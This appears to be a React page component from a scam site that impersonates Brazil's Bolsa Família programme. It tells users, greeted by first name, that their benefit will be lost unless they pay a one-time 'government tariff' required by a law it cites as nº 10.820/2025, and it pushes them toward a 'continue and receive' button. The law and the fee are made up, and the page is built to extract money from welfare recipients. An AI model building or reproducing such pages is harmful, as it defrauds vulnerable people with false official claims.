import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ArrowRight, HelpCircle, AlertTriangle } from 'lucide-react';
import { useUserStore } from '../store/userStore';
import { motion } from 'framer-motion';
import headerImage from '../assets/head.png';

export default function TarifaGoverno() {
  const [, navigate] = useLocation();
  const { userData } = useUserStore();
  const [expandExplanation, setExpandExplanation] = useState(true); // Começa expandido
  const [isPageLoaded, setIsPageLoaded] = useState(false);

  // Animação inicial ao carregar a página
  useEffect(() => {
    setIsPageLoaded(true);
  }, []);

  // Obter apenas o primeiro nome
  const primeiroNome = userData.nome.split(' ')[0];

  const toggleExplanation = () => {
    setExpandExplanation(!expandExplanation);
  };

  const handleContinuar = () => {
    navigate('/');
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Banner do topo com a imagem importada */}
      <div className="w-full">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.8 }}
        >
          <img 
            src={headerImage} 
            alt="Cabeçalho Bolsa Família" 
            className="w-full h-auto" 
          />
        </motion.div>
      </div>

      <div className="p-4">
        {/* Texto principal */}
        <motion.div 
          className="mb-6"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.5 }}
        >
          <p className="text-lg font-bold mb-3">
            Para liberação do pagamento das parcelas do programa Bolsa Família, se tornou obrigatória a contribuição do cidadão com o imposto governamental.
          </p>
          
          <p className="mb-4">
            <span className="font-bold">Caso o pagamento não for feito</span>, o cidadão perderá o direito de receber o benefício.
          </p>
        </motion.div>

        {/* Box amarelo com aviso (com opacidade reduzida) */}
        <motion.div 
          className="bg-yellow-400 bg-opacity-70 text-black p-4 rounded-lg mb-6 shadow-md"
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.6, duration: 0.5 }}
        >
          <div className="flex items-start">
            <AlertTriangle className="h-6 w-6 mr-2 flex-shrink-0 mt-1" />
            <p className="font-medium">
              De acordo com a nova Lei (nº 10.820/2025) imposta pelo governo, é exigido que as parcelas do Bolsa Família de 2025 só sejam pagas aos que contribuírem com as tarifas governamentais.
            </p>
          </div>
        </motion.div>

        {/* Explicação expansível (já começa aberto) */}
        <motion.div 
          className="mb-8 bg-white border border-gray-200 rounded-lg overflow-hidden"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.8, duration: 0.5 }}
        >
          <button 
            className="w-full p-4 flex items-center justify-between bg-gray-50 hover:bg-gray-100 transition-colors"
            onClick={toggleExplanation}
          >
            <div className="flex items-center">
              <HelpCircle className="h-5 w-5 mr-2 text-blue-600" />
              <span className="font-medium">O que é essa tarifa?</span>
            </div>
            <motion.div
              animate={{ rotate: expandExplanation ? 180 : 0 }}
              transition={{ duration: 0.3 }}
            >
              <ArrowRight className="h-5 w-5" />
            </motion.div>
          </button>
          
          {/* Conteúdo expansível (sempre visível inicialmente) */}
          <motion.div 
            className="p-4 bg-white"
            initial={{ opacity: 1 }}
            animate={{ 
              height: expandExplanation ? 'auto' : 0,
              opacity: expandExplanation ? 1 : 0
            }}
            transition={{ duration: 0.3 }}
          >
            <p className="mb-4">
              É o imposto obrigatório para manter o sistema governamental funcionando, de acordo com o valor que você tem a receber...
            </p>
            <p>
              E essa tarifa só precisa ser paga uma única vez e o cidadão poderá receber o pagamento das parcelas do ano inteiro.
            </p>
          </motion.div>
        </motion.div>
        
        {/* Botão de continuar */}
        <motion.button
          className="w-full py-4 bg-[#ee8435] text-white font-bold rounded-md hover:bg-[#df7426] uppercase flex items-center justify-center"
          onClick={handleContinuar}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1, duration: 0.5 }}
          whileHover={{ scale: 1.03 }}
          whileTap={{ scale: 0.98 }}
        >
          CONTINUAR E RECEBER
          <ArrowRight className="ml-2 h-5 w-5" />
        </motion.button>
      </div>
    </div>
  );
}